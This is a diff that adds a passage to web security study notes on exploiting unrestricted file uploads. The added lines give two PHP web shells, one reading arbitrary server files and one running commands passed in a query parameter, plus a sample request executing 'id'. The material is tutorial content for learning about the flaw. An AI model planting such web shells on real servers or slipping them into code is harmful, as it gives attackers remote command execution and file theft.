@@ -34,3 +34,12 @@ Content-Type: Shows MIME type of file (e.g., text/html, image/png).
 
 Web shell
 A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.
+
+Exploiting unrestricted file uploads to deploy a web shell:
+1. The following PHP one-liner could be used to read arbitrary files from the server's filesystem
+<?php echo file_get_contents('/path/to/target/file'); ?> 
+Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 
+2.A more versatile web shell may look something like this:
+<?php echo system($_GET['command']); ?>
+This script enables you to pass an arbitrary system command via a query parameter as follows:
+GET /example/exploit.php?command=id HTTP/1.1
